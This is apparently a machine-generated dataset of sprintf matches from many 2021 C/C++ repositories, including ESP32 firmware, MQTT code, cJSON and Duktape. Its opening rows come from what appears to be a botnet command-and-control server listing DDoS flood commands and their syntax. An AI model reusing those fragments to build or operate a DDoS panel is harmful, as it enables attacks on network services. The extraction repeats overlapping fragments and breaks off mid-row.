				sprintf(ddosline8, ""\e[37m  ║  [+]   BLACKNURSE Flood: BLACKNURSE [IP] [TIME]                                    ║\r\n"");
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline7, ""\e[37m  ║  [+]   HOLD Flood: HOLD [IP] [PORT] [TIME]                                         ║\r\n"");",120,1,"				sprintf(ddosline5, ""\e[37m  ║  [+]   TCP Flood:  TCP  [IP] [PORT] [TIME] [FLAGS/ALL/SYN/ACK/URG/XMAS/ETC] [SIZE] ║\r\n"");
				sprintf(ddosline6, ""\e[37m  ║  [+]   JUNK Flood: JUNK [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline7, ""\e[37m  ║  [+]   HOLD Flood: HOLD [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline8, ""\e[37m  ║  [+]   BLACKNURSE Flood: BLACKNURSE [IP] [TIME]                                    ║\r\n"");
				sprintf(ddosline9, ""\e[37m  ║  [+]   HTTP Flood: HTTP [METHOD] [TARGET] [PORT] / [TIME] [POWER]                  ║\r\n"");
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline8, ""\e[37m  ║  [+]   BLACKNURSE Flood: BLACKNURSE [IP] [TIME]                                    ║\r\n"");",120,1,"				sprintf(ddosline6, ""\e[37m  ║  [+]   JUNK Flood: JUNK [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline7, ""\e[37m  ║  [+]   HOLD Flood: HOLD [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline8, ""\e[37m  ║  [+]   BLACKNURSE Flood: BLACKNURSE [IP] [TIME]                                    ║\r\n"");
				sprintf(ddosline9, ""\e[37m  ║  [+]   HTTP Flood: HTTP [METHOD] [TARGET] [PORT] / [TIME] [POWER]                  ║\r\n"");
				sprintf(ddosline10, ""\e[37m  ║  [+]   HTTP Hex: HTTPHEX [METHOD] [TARGET] [PORT] / [TIME] [POWER]                 ║\r\n"");
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline9, ""\e[37m  ║  [+]   HTTP Flood: HTTP [METHOD] [TARGET] [PORT] / [TIME] [POWER]                  ║\r\n"");",120,1,"				sprintf(ddosline7, ""\e[37m  ║  [+]   HOLD Flood: HOLD [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline8, ""\e[37m  ║  [+]   BLACKNURSE Flood: BLACKNURSE [IP] [TIME]                                    ║\r\n"");
				sprintf(ddosline9, ""\e[37m  ║  [+]   HTTP Flood: HTTP [METHOD] [TARGET] [PORT] / [TIME] [POWER]                  ║\r\n"");
				sprintf(ddosline10, ""\e[37m  ║  [+]   HTTP Hex: HTTPHEX [METHOD] [TARGET] [PORT] / [TIME] [POWER]                 ║\r\n"");
				sprintf(ddosline11, ""\e[37m  ║  [+]   OVH UDP RAPE FLOOD:  OVH [IP] [PORT] [SIZE] [TIME] [FORKS]                  ║\r\n"");
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline10, ""\e[37m  ║  [+]   HTTP Hex: HTTPHEX [METHOD] [TARGET] [PORT] / [TIME] [POWER]                 ║\r\n"");",120,1,"				sprintf(ddosline8, ""\e[37m  ║  [+]   BLACKNURSE Flood: BLACKNURSE [IP] [TIME]                                    ║\r\n"");
				sprintf(ddosline9, ""\e[37m  ║  [+]   HTTP Flood: HTTP [METHOD] [TARGET] [PORT] / [TIME] [POWER]                  ║\r\n"");
				sprintf(ddosline10, ""\e[37m  ║  [+]   HTTP Hex: HTTPHEX [METHOD] [TARGET] [PORT] / [TIME] [POWER]                 ║\r\n"");
				sprintf(ddosline11, ""\e[37m  ║  [+]   OVH UDP RAPE FLOOD:  OVH [IP] [PORT] [SIZE] [TIME] [FORKS]                  ║\r\n"");
				sprintf(ddosline12, ""\e[37m  ╚════════════════════════════════════════════════════════════════════════════════════╝\r\n"");
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline11, ""\e[37m  ║  [+]   OVH UDP RAPE FLOOD:  OVH [IP] [PORT] [SIZE] [TIME] [FORKS]                  ║\r\n"");",120,1,"				sprintf(ddosline9, ""\e[37m  ║  [+]   HTTP Flood: HTTP [METHOD] [TARGET] [PORT] / [TIME] [POWER]                  ║\r\n"");
				sprintf(ddosline10, ""\e[37m  ║  [+]   HTTP Hex: HTTPHEX [METHOD] [TARGET] [PORT] / [TIME] [POWER]                 ║\r\n"");
				sprintf(ddosline11, ""\e[37m  ║  [+]   OVH UDP RAPE FLOOD:  OVH [IP] [PORT] [SIZE] [TIME] [FORKS]                  ║\r\n"");
				sprintf(ddosline12, ""\e[37m  ╚════════════════════════════════════════════════════════════════════════════════════╝\r\n"");

"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline12, ""\e[37m  ╚════════════════════════════════════════════════════════════════════════════════════╝\r\n"");",120,1,"				sprintf(ddosline10, ""\e[37m  ║  [+]   HTTP Hex: HTTPHEX [METHOD] [TARGET] [PORT] / [TIME] [POWER]                 ║\r\n"");
				sprintf(ddosline11, ""\e[37m  ║  [+]   OVH UDP RAPE FLOOD:  OVH [IP] [PORT] [SIZE] [TIME] [FORKS]                  ║\r\n"");
				sprintf(ddosline12, ""\e[37m  ╚════════════════════════════════════════════════════════════════════════════════════╝\r\n"");

				if(send(datafd, ddosline1,  strlen(ddosline1),	MSG_NOSIGNAL) == -1) goto end;
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[32mMute Disabled!\x1b[37m\r\n"");",120,1,"                {
                    managements[datafd].mute = 0;
                    sprintf(botnet, ""\x1b[32mMute Disabled!\x1b[37m\r\n"");
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[31mError, Mute is Already Disabled.\x1b[37m\r\n"");",120,1,"                else
                {
                    sprintf(botnet, ""\x1b[31mError, Mute is Already Disabled.\x1b[37m\r\n"");
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[32mMute Enabled!\x1b[37m\r\n"");",120,1,"                {
                    managements[datafd].mute = 1;
                    sprintf(botnet, ""\x1b[32mMute Enabled!\x1b[37m\r\n"");
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[31mError, Mute is Already Enabled.\x1b[37m\r\n"");",120,1,"                else
                {
                    sprintf(botnet, ""\x1b[31mError, Mute is Already Enabled.\x1b[37m\r\n"");
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(killattack, ""Succesfully Stopped Attack!\r\n"");",120,1,"				char killattack [2048];
				memset(killattack, 0, 2048);
				sprintf(killattack, ""Succesfully Stopped Attack!\r\n"");
				if(send(datafd, killattack, strlen(killattack), MSG_NOSIGNAL) == -1) goto end;
			}
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(auresp, ""\x1b[39mEnter new unsername\x1b[35m: \x1b[37m"");",120,1,"					memset(new_username, 0, sizeof(new_username));
					memset(new_password, 0, sizeof(new_password));
					sprintf(auresp, ""\x1b[39mEnter new unsername\x1b[35m: \x1b[37m"");
					if(send(datafd, auresp, strlen(auresp), MSG_NOSIGNAL) == -1) goto end;
					memset(auresp, 0, sizeof(auresp));
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(auresp, ""\x1b[39mEnter new password\x1b[35m: \x1b[37m"");",120,1,"					}
					memset(auresp, 0, sizeof(auresp));
					sprintf(auresp, ""\x1b[39mEnter new password\x1b[35m: \x1b[37m"");
					if(send(datafd, auresp, strlen(auresp), MSG_NOSIGNAL) == -1) goto end;
					memset(auresp, 0, sizeof(auresp));
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(clearscreen, ""\033[2J\033[1;1H"");",120,1,"				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, ""\033[2J\033[1;1H"");
				if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
            }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(logoutmessage, ""Redirecting..., %s"", accounts[find_line].username);",120,1,"				char logoutmessage [2048];
				memset(logoutmessage, 0, 2048);
				sprintf(logoutmessage, ""Redirecting..., %s"", accounts[find_line].username);
				if(send(datafd, logoutmessage, strlen(logoutmessage), MSG_NOSIGNAL) == -1)goto end;
				sleep(5);
"
2021\esp-discord\src\discord_ota.c,Dataset Download,../../Dataset Download/2021\esp-discord\src\discord_ota.c,"sprintf(sha256 + (i * 2), ""%02x"", hash[i]);",120,1,"
    for (int i = 0; i < hash_len; i++) {
        sprintf(sha256 + (i * 2), ""%02x"", hash[i]);
    }

"
2021\esp-discord\src\discord_ota.c,Dataset Download,../../Dataset Download/2021\esp-discord\src\discord_ota.c,"sprintf(uptime, ""%lld ms"", esp_timer_get_time() / 1000);",120,1,"
    char uptime[25];
    sprintf(uptime, ""%lld ms"", esp_timer_get_time() / 1000);

    char free_heap[15];
"
2021\esp-discord\src\discord_ota.c,Dataset Download,../../Dataset Download/2021\esp-discord\src\discord_ota.c,"sprintf(free_heap, ""%d bytes"", esp_get_free_heap_size());",120,1,"
    char free_heap[15];
    sprintf(free_heap, ""%d bytes"", esp_get_free_heap_size());

    char* content = estr_cat(
"
2021\ESP32WiFiSnifferApp\ESP32WiFiSnifferApp\src\generalFunctions.cpp,Dataset Download,../../Dataset Download/2021\ESP32WiFiSnifferApp\ESP32WiFiSnifferApp\src\generalFunctions.cpp,"sprintf( stringMac, ""%02X:%02X:%02X:%02X:%02X:%02X"",",120,1,"       Our MAC format contains 2 * 6 = 12 characters for the 6 two digit hex values and 5 colons between them.
       Therefore we need: 12 (MACs) + 5 (colons) + 1 (0 at end) = 18 characters for buffer size. */
    sprintf( stringMac, ""%02X:%02X:%02X:%02X:%02X:%02X"",
             mac.mac[0], mac.mac[1], mac.mac[2],
             mac.mac[3], mac.mac[4], mac.mac[5] );   // Formatting the data into the standard ""MAC style"".
"
2021\ESP32WiFiSnifferApp\ESP32WiFiSnifferApp\src\generalFunctions.cpp,Dataset Download,../../Dataset Download/2021\ESP32WiFiSnifferApp\ESP32WiFiSnifferApp\src\generalFunctions.cpp,"sprintf( stringTimestamp, ""%lu"", timestamp );",120,1,"void timestampTostring( char* stringTimestamp, unsigned long timestamp )
{
    sprintf( stringTimestamp, ""%lu"", timestamp );

} // timestampTostring
"
2021\ESP32WiFiSnifferApp\ESP32WiFiSnifferApp\src\generalFunctions.cpp,Dataset Download,../../Dataset Download/2021\ESP32WiFiSnifferApp\ESP32WiFiSnifferApp\src\generalFunctions.cpp,"sprintf( stringPacketCounter, ""%u"", packetCounter );",120,1,"void packetCounterTostring( char* stringPacketCounter, unsigned int& packetCounter )
{
    sprintf( stringPacketCounter, ""%u"", packetCounter );

} // packetCounterTostring
"
2021\ESP32WiFiSnifferApp\ESP32WiFiSnifferApp\src\generalFunctions.cpp,Dataset Download,../../Dataset Download/2021\ESP32WiFiSnifferApp\ESP32WiFiSnifferApp\src\generalFunctions.cpp,"sprintf( stringRSSI, ""%d"", RSSI );",120,1,"void RSSITostring( char* stringRSSI, int8_t& RSSI )
{
    sprintf( stringRSSI, ""%d"", RSSI ); 

} // RSSITostring
"
2021\fusor-state-machine\src\StateMachineDebug.h,Dataset Download,../../Dataset Download/2021\fusor-state-machine\src\StateMachineDebug.h,"sprintf(buff, ""%d"", value);",120,1,"    inline Trace &operator<<(int value)
    {
        sprintf(buff, ""%d"", value);
        __debugPrinter(buff);
        return *this;
"
2021\fusor-state-machine\src\StateMachineDebug.h,Dataset Download,../../Dataset Download/2021\fusor-state-machine\src\StateMachineDebug.h,"sprintf(buff, ""%ld"", value);",120,1,"    inline Trace &operator<<(long int value)
    {
        sprintf(buff, ""%ld"", value);
        __debugPrinter(buff);
        return *this;
"
2021\fusor-state-machine\src\StateMachineDebug.h,Dataset Download,../../Dataset Download/2021\fusor-state-machine\src\StateMachineDebug.h,"sprintf(buff, ""%lu"", value);",120,1,"    inline Trace &operator<<(unsigned long value)
    {
        sprintf(buff, ""%lu"", value);
        __debugPrinter(buff);
        return *this;
"
2021\fusor-state-machine\src\StateMachineDebug.h,Dataset Download,../../Dataset Download/2021\fusor-state-machine\src\StateMachineDebug.h,"sprintf(buff, ""%ld.%04ld"", fixed / 10000L, fixed % 10000L);",120,1,"
        long int fixed = (long int)(value * 10000.0 + 0.5);
        sprintf(buff, ""%ld.%04ld"", fixed / 10000L, fixed % 10000L);
        __debugPrinter(buff);
        return *this;
"
2021\greenhouse-firmware\src\main.cpp,Dataset Download,../../Dataset Download/2021\greenhouse-firmware\src\main.cpp,"sprintf(mqtt_payload_buffer, ""%.2f"", payload);",120,1,"void mqtt_publish(const char* topic, float payload)
{
    sprintf(mqtt_payload_buffer, ""%.2f"", payload);
	mqtt_publish_buffer(topic, mqtt_payload_buffer);
}
"
2021\greenhouse-firmware\src\main.cpp,Dataset Download,../../Dataset Download/2021\greenhouse-firmware\src\main.cpp,"sprintf(mqtt_payload_buffer, ""%d"", payload);",120,1,"void mqtt_publish(const char* topic, unsigned int payload)
{
    sprintf(mqtt_payload_buffer, ""%d"", payload);
	mqtt_publish_buffer(topic, mqtt_payload_buffer);
}
"
2021\greenhouse-firmware\src\main.cpp,Dataset Download,../../Dataset Download/2021\greenhouse-firmware\src\main.cpp,"sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_HUM, i);",120,1,"    for(int i=0; i<NUM_DHTS; i++)
    {
        sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_HUM, i);
        mqtt_publish(mqtt_topic_buffer, data->hum[i]);
        sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_TEMP, i);
"
2021\greenhouse-firmware\src\main.cpp,Dataset Download,../../Dataset Download/2021\greenhouse-firmware\src\main.cpp,"sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_TEMP, i);",120,1,"        sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_HUM, i);
        mqtt_publish(mqtt_topic_buffer, data->hum[i]);
        sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_TEMP, i);
        mqtt_publish(mqtt_topic_buffer, data->temp[i]);
        sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_IDX, i);
"
2021\greenhouse-firmware\src\main.cpp,Dataset Download,../../Dataset Download/2021\greenhouse-firmware\src\main.cpp,"sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_IDX, i);",120,1,"        sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_TEMP, i);
        mqtt_publish(mqtt_topic_buffer, data->temp[i]);
        sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_IDX, i);
        mqtt_publish(mqtt_topic_buffer, data->hic[i]);
    }
"
2021\greenhouse-firmware\src\main.cpp,Dataset Download,../../Dataset Download/2021\greenhouse-firmware\src\main.cpp,"sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_SOIL, i);",120,1,"    for(int i=0; i<NUM_SOILS; i++)
    {
        sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_SOIL, i);
        mqtt_publish(mqtt_topic_buffer, data->moist[i]);
    }
"
2021\greenhouse-firmware\src\main.cpp,Dataset Download,../../Dataset Download/2021\greenhouse-firmware\src\main.cpp,"sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_PUMP, i);",120,1,"            for(int i=0; i<NUM_PUMPS; i++)
            {
                sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_PUMP, i);
                bool res = mqtt_client.subscribe(mqtt_topic_buffer, 1);
                Serial.printf(""Subscribed to: %s, ok: %d\n"", mqtt_topic_buffer, res?1:0);
"
2021\haas-mini-program\adapter\platform\aos-haas100\amp_tls_mbedtls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\amp_tls_mbedtls.c,"sprintf(port_str, ""%u"", port);",120,1,"    memset(pTlsData, 0x0, sizeof(TLSDataParams_t));

    sprintf(port_str, ""%u"", port);

    if (0 != _TLSConnectNetwork(pTlsData, host, port_str, ca_crt, ca_crt_len,
"
2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_tcp.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_tcp.c,"sprintf(service, ""%u"", port);",120,1,"    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    sprintf(service, ""%u"", port);

    if ((rc = getaddrinfo(host, service, &hints, &addrInfoList)) != 0) {
"
2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_udp.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_udp.c,"sprintf(port_ptr, ""%u"", port);",120,1,"    }

    sprintf(port_ptr, ""%u"", port);
    memset((char *)&hints, 0x00, sizeof(hints));
    hints.ai_socktype = SOCK_DGRAM;
"
2021\haas-mini-program\components\linkkit\dev_model\impl_ntp.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_ntp.c,"sprintf(elem, ""%09u"", (unsigned int)tx);",120,1,"
    if (len > 9) {
        sprintf(elem, ""%09u"", (unsigned int)tx);
    } else {
        sprintf(elem, ""%u"", (unsigned int)tx);
"
2021\haas-mini-program\components\linkkit\dev_model\impl_ntp.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_ntp.c,"sprintf(elem, ""%u"", (unsigned int)tx);",120,1,"        sprintf(elem, ""%09u"", (unsigned int)tx);
    } else {
        sprintf(elem, ""%u"", (unsigned int)tx);
    }

"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"length = sprintf((char *)number_buffer, ""null"");",120,1,"    /* This checks for NaN and Infinity */
    if ((d * 0) != 0) {
        length = sprintf((char *)number_buffer, ""null"");
    } else {
        /* Try float data type */
"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"length = sprintf((char *)number_buffer, ""%f"", d);",120,1,"    } else {
        /* Try float data type */
        length = sprintf((char *)number_buffer, ""%f"", d);

        if ((sscanf((char *)number_buffer, ""%f"", &test_float) != 1) || ((double)test_float != d)) {
"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"length = sprintf((char *)number_buffer, ""%1.15g"", d);",120,1,"        if ((sscanf((char *)number_buffer, ""%f"", &test_float) != 1) || ((double)test_float != d)) {
            /* Try 15 decimal places of precision to avoid nonsignificant nonzero digits */
            length = sprintf((char *)number_buffer, ""%1.15g"", d);

            /* Check whether the original double can be recovered */
"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"length = sprintf((char *)number_buffer, ""%1.17g"", d);",120,1,"            if ((sscanf((char *)number_buffer, ""%lg"", &test) != 1) || ((double)test != d)) {
                /* If not, print with 17 decimal places of precision */
                length = sprintf((char *)number_buffer, ""%1.17g"", d);
            }
        } else {
"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"sprintf((char *)output_pointer, ""u%04x"", *input_pointer);",120,1,"                default:
                    /* escape and print as unicode codepoint */
                    sprintf((char *)output_pointer, ""u%04x"", *input_pointer);
                    output_pointer += 4;
                    break;
"
2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,"sprintf(rsp_buf, HTTP_HEADER, host_file, host_addr, port);",120,1,"
    memset(rsp_buf, 0, HTTP_BUFF_SIZE);
    sprintf(rsp_buf, HTTP_HEADER, host_file, host_addr, port);

    send      = 0;
"
2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,"sprintf(http_buf, ""%s"", ""ERROR"");",120,1,"    {
        memset(http_buf, 0, HTTP_BUFF_SIZE);
        sprintf(http_buf, ""%s"", ""ERROR"");
    }

"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK_INTERNAL_DECL void duk_fb_sprintf(duk_fixedbuffer *fb, const char *fmt, ...);",120,1,"DUK_INTERNAL_DECL void duk_fb_put_byte(duk_fixedbuffer *fb, duk_uint8_t x);
DUK_INTERNAL_DECL void duk_fb_put_cstring(duk_fixedbuffer *fb, const char *x);
DUK_INTERNAL_DECL void duk_fb_sprintf(duk_fixedbuffer *fb, const char *fmt, ...);
DUK_INTERNAL_DECL void duk_fb_put_funcptr(duk_fixedbuffer *fb, duk_uint8_t *fptr, duk_size_t fptr_size);
DUK_INTERNAL_DECL duk_bool_t duk_fb_is_full(duk_fixedbuffer *fb);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_push_sprintf(thr, ""ctx: top=%ld, stack=%s"", (long) top, (const char *) duk_safe_to_string(thr, -1));",120,1,"	                             DUK_JSON_FLAG_AVOID_KEY_QUOTES /*flags*/);

	duk_push_sprintf(thr, ""ctx: top=%ld, stack=%s"", (long) top, (const char *) duk_safe_to_string(thr, -1));
	duk_replace(thr, -3);  /* [ ... arr jsonx(arr) res ] -> [ ... res jsonx(arr) ] */
	duk_pop(thr);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_push_sprintf(thr, ""%ld %ld %s %s\n"",",120,1,"	 * we must write raw, unframed bytes here.
	 */
	duk_push_sprintf(thr, ""%ld %ld %s %s\n"",
	                 (long) DUK_DEBUG_PROTOCOL_VERSION,
	                 (long) DUK_VERSION,
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_push_sprintf(thr, DUK_STR_FMT_PTR, (void *) ptr);",120,1,"		void *ptr = DUK_TVAL_GET_POINTER(tv);
		if (ptr != NULL) {
			duk_push_sprintf(thr, DUK_STR_FMT_PTR, (void *) ptr);
		} else {
			/* Represent a null pointer as 'null' to be consistent with
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK_LOCAL duk_int_t duk__try_push_vsprintf(duk_hthread *thr, void *buf, duk_size_t sz, const char *fmt, va_list ap) {",120,1,"
/* XXX: duk_ssize_t would be useful here */
DUK_LOCAL duk_int_t duk__try_push_vsprintf(duk_hthread *thr, void *buf, duk_size_t sz, const char *fmt, va_list ap) {
	duk_int_t len;

"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK_EXTERNAL const char *duk_push_vsprintf(duk_hthread *thr, const char *fmt, va_list ap) {",120,1,"}

DUK_EXTERNAL const char *duk_push_vsprintf(duk_hthread *thr, const char *fmt, va_list ap) {
	duk_uint8_t stack_buf[DUK_PUSH_SPRINTF_INITIAL_SIZE];
	duk_size_t sz = DUK_PUSH_SPRINTF_INITIAL_SIZE;
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"len = duk__try_push_vsprintf(thr, buf, sz, fmt, ap_copy);",120,1,"
		DUK_VA_COPY(ap_copy, ap);
		len = duk__try_push_vsprintf(thr, buf, sz, fmt, ap_copy);
		va_end(ap_copy);
		if (len >= 0) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK_EXTERNAL const char *duk_push_sprintf(duk_hthread *thr, const char *fmt, ...) {",120,1,"}

DUK_EXTERNAL const char *duk_push_sprintf(duk_hthread *thr, const char *fmt, ...) {
	va_list ap;
	const char *ret;
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"ret = duk_push_vsprintf(thr, fmt, ap);",120,1,"	/* allow fmt==NULL */
	va_start(ap, fmt);
	ret = duk_push_vsprintf(thr, fmt, ap);
	va_end(ap);

"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_push_vsprintf(thr, fmt, ap);",120,1,"	/* ... and its 'message' from an instance property */
	if (fmt) {
		duk_push_vsprintf(thr, fmt, ap);
		duk_xdef_prop_stridx_short(thr, -2, DUK_STRIDX_MESSAGE, DUK_PROPDESC_FLAGS_WC);
	} else {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_push_sprintf(thr, ""_%04x"", (unsigned int) lf_flags);",120,1,"	duk_push_literal(thr, ""light_"");
	duk_push_string_funcptr(thr, (duk_uint8_t *) &func, sizeof(func));
	duk_push_sprintf(thr, ""_%04x"", (unsigned int) lf_flags);
	duk_concat(thr, 3);
}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_push_sprintf(thr, ""[buffer:%ld]"", (long) DUK_HBUFFER_GET_SIZE(h));",120,1,"			duk_hbuffer *h = DUK_TVAL_GET_BUFFER(tv);
			DUK_ASSERT(h != NULL);
			duk_push_sprintf(thr, ""[buffer:%ld]"", (long) DUK_HBUFFER_GET_SIZE(h));
			break;
		}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_push_sprintf(thr, ""(%s)"", duk_to_string(thr, -1));",120,1,"			 */
			duk_push_tval(thr, tv);
			duk_push_sprintf(thr, ""(%s)"", duk_to_string(thr, -1));
			duk_remove_m2(thr);
			break;
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_push_sprintf(thr, ""native_"");",120,1,"	DUK_ASSERT(DUK_HOBJECT_IS_NATFUNC((duk_hobject *) h));

	duk_push_sprintf(thr, ""native_"");
	func = h->func;
	duk_push_string_funcptr(thr, (duk_uint8_t *) &func, sizeof(func));
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_push_sprintf(thr, ""_%04x_%04x"",",120,1,"	func = h->func;
	duk_push_string_funcptr(thr, (duk_uint8_t *) &func, sizeof(func));
	duk_push_sprintf(thr, ""_%04x_%04x"",
	                 (unsigned int) (duk_uint16_t) h->nargs,
	                 (unsigned int) (duk_uint16_t) h->magic);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_push_sprintf(enc_ctx->thr, ""(%s)"", ptr);",120,1,"	ptr = duk_to_string(enc_ctx->thr, -1);
	DUK_ASSERT(ptr != NULL);
	duk_push_sprintf(enc_ctx->thr, ""(%s)"", ptr);
	duk_remove(enc_ctx->thr, -2);
	duk__cbor_encode_string_top(enc_ctx);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_push_sprintf(thr, ""at %s light%s%s%s%s%s"",",120,1,"
				if (h_func == NULL) {
					duk_push_sprintf(thr, ""at %s light%s%s%s%s%s"",
					                 (const char *) funcname,
					                 (const char *) ((flags & DUK_ACT_FLAG_STRICT) ? str_strict : str_empty),
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_push_sprintf(thr, ""at %s (%s) native%s%s%s%s%s"",",120,1,"					                 (const char *) ((flags & DUK_ACT_FLAG_PREVENT_YIELD) ? str_prevyield : str_empty));
				} else if (DUK_HOBJECT_HAS_NATFUNC(h_func)) {
